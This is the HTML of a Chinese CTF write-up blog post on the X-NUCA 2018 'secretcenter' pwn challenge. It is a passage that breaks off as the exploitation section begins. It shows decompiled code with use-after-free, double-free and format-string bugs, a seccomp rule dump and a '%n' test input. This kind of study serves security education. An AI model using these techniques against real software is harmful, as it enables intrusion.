@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="P4nda" />
+
+
+
+<meta name="description" content="此题是X-NUCA&apos;2018的一道题目，在比赛过程中没有队伍解出。赛后在得到AFang师傅的提示后复现成功。">
+<meta name="keywords" content="CTF,PWN">
+<meta property="og:type" content="article">
+<meta property="og:title" content="X-NUCA&#39;2018 secretcenter 解题思路">
+<meta property="og:url" content="http://p4nda.top/2018/11/26/XNUCA-secretcenter/index.html">
+<meta property="og:site_name" content="p4nda&#39;s blog">
+<meta property="og:description" content="此题是X-NUCA&apos;2018的一道题目，在比赛过程中没有队伍解出。赛后在得到AFang师傅的提示后复现成功。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-11-26T04:38:54.543Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="X-NUCA&#39;2018 secretcenter 解题思路">
+<meta name="twitter:description" content="此题是X-NUCA&apos;2018的一道题目，在比赛过程中没有队伍解出。赛后在得到AFang师傅的提示后复现成功。">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="p4nda&#39;s blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/p4nda.jpeg">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>X-NUCA&#39;2018 secretcenter 解题思路 | p4nda&#39;s blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?11859a78d84a58f3a5bac3d2ec5ea89e";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/p4nda.jpeg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">P4nda</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:root@p4nda.xyz" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" href="https://www.weibo.com/3655650510/profile?rightmod=1&wvr=6&mod=personinfo" title="新浪微博"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/ret2p4nda" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa 知乎" href="https://www.zhihu.com/people/panda_Z/activities" title="知乎"></a>
+                            
+                                <a class="fa 博客园" href="http://www.cnblogs.com/p4nda/" title="博客园"></a>
+                            
+                                <a class="fa QQ" href="/381124487" title="QQ"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/KERNEL/">KERNEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWN/">PWN</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWNABLE-TW/">PWNABLE.TW</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Questions/">Questions</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://0gur1.cc">0gur1</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://tacxingxing.com">Tac1t0rnX</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://veritas501.space/">Veritas501</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://p1umer.club/">p1umer</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="//p4nda.top/WooyunDrops/">Wooyun知识库</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">PWNer of Dubhe | PWN &amp; security | byr</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">P4nda</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/p4nda.jpeg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">P4nda</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:root@p4nda.xyz" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" target="_blank" href="https://www.weibo.com/3655650510/profile?rightmod=1&wvr=6&mod=personinfo" title="新浪微博"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/ret2p4nda" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa 知乎" target="_blank" href="https://www.zhihu.com/people/panda_Z/activities" title="知乎"></a>
+                            
+                                <a class="fa 博客园" target="_blank" href="http://www.cnblogs.com/p4nda/" title="博客园"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="/381124487" title="QQ"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-XNUCA-secretcenter" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/11/26/XNUCA-secretcenter/" class="article-date">
+      <time datetime="2018-11-26T02:54:00.000Z" itemprop="datePublished">2018-11-26</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      X-NUCA&#39;2018 secretcenter 解题思路
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/">PWN</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>此题是X-NUCA’2018的一道题目，在比赛过程中没有队伍解出。赛后在得到AFang师傅的提示后复现成功，感谢AFang师傅。题目及附件<a href="https://github.com/ret2p4nda/libc-pwn/tree/master/secretcenter" target="_blank" rel="noopener">下载</a></p>
+<h1 id="题目及漏洞分析"><a href="#题目及漏洞分析" class="headerlink" title="题目及漏洞分析"></a>题目及漏洞分析</h1><p>题目中初始化过程中首先从’secret.txt’中读入一个字符串，存放在申请的堆中。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_secret</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  bss_malloc_secret = <span class="built_in">malloc</span>(<span class="number">0x78</span>uLL);</span><br><span class="line">  v0 = open(<span class="string">"secret.txt"</span>, <span class="number">0x80000</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v0 == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  v1 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)read(v0, bss_malloc_secret, <span class="number">0x78</span>uLL) == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> close(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>用户可以输入size申请不大于0x18f大小堆块，并向堆块中输入内容，内容首先输入在栈上，然后通过memcpy复制到堆上，此时栈上是有用户输入的。然后逐字节与secret.txt读入的内容比较，判断是否相等。当相同字节数等于strlen(secret)时，会调用一个函数，这个函数会通过读取/proc/self/maps文件，给出程序的内存空间分布，最终将用户的输入输出到stderr文件，此处用了_fprintf_chk函数，是fprintf的安全版本，存在一个格式化字符串漏洞，但是由于是向stderr输出，并不会返回给用户，无法泄露地址。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">input</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ebp</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// kr08_8</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// eax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+Ch] [rbp-22Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+218h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Secret Size: "</span>);</span><br><span class="line">  LODWORD(size) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;size);</span><br><span class="line">  v0 = size;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(size - <span class="number">0x65</span>) &gt; <span class="number">0x12A</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  bss_malloc_user = <span class="built_in">malloc</span>((<span class="keyword">unsigned</span> <span class="keyword">int</span>)size);</span><br><span class="line">  bss_size = v0;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Content: \n"</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">  syscall(<span class="number">0L</span>L, <span class="number">0L</span>L, (<span class="keyword">char</span> *)&amp;size + <span class="number">4</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size);</span><br><span class="line">  <span class="built_in">memcpy</span>(bss_malloc_user, (<span class="keyword">char</span> *)&amp;size + <span class="number">4</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)bss_malloc_secret) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v1 - <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)bss_malloc_secret + i) != *((_BYTE *)bss_malloc_user + i) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Not Good Secret :P\n"</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v3 == <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)bss_malloc_secret) )</span><br><span class="line">    give_vmmap();</span><br><span class="line">  _fprintf_chk((__int64)<span class="built_in">stderr</span>, <span class="number">1L</span>L, (__int64)&amp;size + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在释放函数中，程序可以对input函数中申请的堆块释放，但没有把指针清空，存在悬垂指针，导致double free。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">free</span>(bss_malloc_user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>并且可以通过edit函数，对之前的堆块进行修改，由于悬垂指针的问题，存在UAF。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">edit_secret</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"size: \n"</span>, <span class="number">7u</span>LL);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v1 &lt;= <span class="number">0</span> || v1 &gt;= bss_size )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Content: \n"</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> syscall(<span class="number">0L</span>L, <span class="number">0L</span>L, bss_malloc_user, v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此外，用户可以通过guard_ready函数，首先通过malloc申请一个0xf0的堆块，并且对这个堆块初始化一些数据，这个数据是一段预置的seccomp规则，后续再说。</p>
+<p>在set_guard函数中，通过prctl函数将之前预置的seccomp规则生效。此处存在一个问题，由于程序可以任意设置大小的堆块，而设置seccomp规则的函数与ptctl不在一个函数中，因此可以通过UAF来修改这个seccomp规则。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">set_guard</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  __int16 v1; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v1 = guard_num;</span><br><span class="line">  v2 = bss_guard;</span><br><span class="line">  <span class="keyword">if</span> ( prctl(<span class="number">38</span>, <span class="number">1L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  result = prctl(<span class="number">0x16</span>, <span class="number">2L</span>L, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">"what?"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>程序存在两个显式漏洞堆漏洞和格式化字符串。但是fprintf_chk函数不能使用%n写入数据，由于输出是stderr的情况也不能泄露数据。并且由于程序开启了全部的保护规则，因此仅通过堆漏洞，无法获得地址利用，但是将二者结合使用，会出现很有意思的情况。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">└─[$] &lt;&gt; checksec secret_center </span><br><span class="line">[*] <span class="string">'/home/p4nda/Desktop/pwn/other/xnuca/secretcenter/secret_center'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
+<h2 id="seccomp"><a href="#seccomp" class="headerlink" title="seccomp"></a>seccomp</h2><p>seccomp是在内核中实现的对于用户系统调用及其参数的过滤，决定是否继续调用此系统调用，相当于自废武功，在CTF通防中很容易遇到，一般会禁用execve这样的系统调用，防止拿到shell。</p>
+<p>在内核处理请求系统调用时在此处（\arch\x86\entry\enrty_64.S  line 247）进入检查，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">	<span class="comment">/* Do syscall entry tracing */</span></span><br><span class="line">tracesys:</span><br><span class="line">	movq	%rsp, %rdi</span><br><span class="line">	movl	$AUDIT_ARCH_X86_64, %esi</span><br><span class="line">	call	syscall_trace_enter_phase1</span><br><span class="line">	test	%rax, %rax</span><br><span class="line">	jnz	tracesys_phase2			<span class="comment">/* if needed, run the slow path */</span></span><br><span class="line">	RESTORE_C_REGS_EXCEPT_RAX		<span class="comment">/* else restore clobbered regs */</span></span><br><span class="line">	movq	ORIG_RAX(%rsp), %rax</span><br><span class="line">	jmp	entry_SYSCALL_64_fastpath	<span class="comment">/* and return to the fast path */</span></span><br><span class="line"></span><br><span class="line">tracesys_phase2:</span><br><span class="line">	SAVE_EXTRA_REGS</span><br><span class="line">	movq	%rsp, %rdi</span><br><span class="line">	movl	$AUDIT_ARCH_X86_64, %esi</span><br><span class="line">	movq	%rax, %rdx</span><br><span class="line">	call	syscall_trace_enter_phase2</span><br></pre></td></tr></table></figure>
+<p>具体的检查机制在\arch\x86\net\bpf_jit_comp.c中。</p>
+<p>好在david942j@217已经写出一套可以方便分析seccomp功能及编写seccomp的工具<a href="https://github.com/david942j/seccomp-tools" target="_blank" rel="noopener">seccomp-tools</a></p>
+<p>如分析程序预置的seccomp规则.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">└─[$] &lt;&gt; seccomp-tools dump ./secret_center </span><br><span class="line">Welcome to Secret Center!</span><br><span class="line">[*]Reinforcable Secret Service..</span><br><span class="line">[1] show secret on Server</span><br><span class="line">[2] input my secret</span><br><span class="line">[3] delete my secret</span><br><span class="line">[4] Guard Ready</span><br><span class="line">[5] Set Guard</span><br><span class="line">[6] edit my secret</span><br><span class="line">[7] <span class="built_in">exit</span></span><br><span class="line">&gt;</span><br><span class="line">4</span><br><span class="line">[1] show secret on Server</span><br><span class="line">[2] input my secret</span><br><span class="line">[3] delete my secret</span><br><span class="line">[4] Guard Ready</span><br><span class="line">[5] Set Guard</span><br><span class="line">[6] edit my secret</span><br><span class="line">[7] <span class="built_in">exit</span></span><br><span class="line">&gt;</span><br><span class="line">5</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x01 0x00 0xc000003e  <span class="keyword">if</span> (A == ARCH_X86_64) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0003: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0004: 0x15 0x00 0x01 0x000000e7  <span class="keyword">if</span> (A != exit_group) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0006: 0x15 0x00 0x01 0x00000000  <span class="keyword">if</span> (A != <span class="built_in">read</span>) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x00000002  <span class="keyword">if</span> (A != open) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0010: 0x15 0x00 0x01 0x00000001  <span class="keyword">if</span> (A != write) goto 0012</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0012: 0x15 0x00 0x01 0x00000003  <span class="keyword">if</span> (A != close) goto 0014</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0014: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure>
+<h2 id="fprintf-chk"><a href="#fprintf-chk" class="headerlink" title="fprintf_chk"></a>fprintf_chk</h2><p>这个函数在潜意识里觉得这个函数的格式化字符串漏洞是没有办法利用的。如执行%n</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">└─[$] &lt;&gt; ./secret_center </span><br><span class="line">Welcome to Secret Center!</span><br><span class="line">[*]Reinforcable Secret Service..</span><br><span class="line">[1] show secret on Server</span><br><span class="line">[2] input my secret</span><br><span class="line">[3] delete my secret</span><br><span class="line">[4] Guard Ready</span><br><span class="line">[5] Set Guard</span><br><span class="line">[6] edit my secret</span><br><span class="line">[7] <span class="built_in">exit</span></span><br><span class="line">&gt;</span><br><span class="line">2</span><br><span class="line">Secret Size: </span><br><span class="line">123</span><br><span class="line">Content: </span><br><span class="line">%n</span><br><span class="line">Not Good Secret :P</span><br><span class="line"></span><br><span class="line">*** %n <span class="keyword">in</span> writable segment detected ***</span><br><span class="line">[1]    42169 abort (core dumped)  ./secret_center</span><br></pre></td></tr></table></figure>
+<p>可以看到%n被检测出来，可以看一下检测的逻辑在glibc-2.23\stdio-common\vfprintf.c  line 892</p>
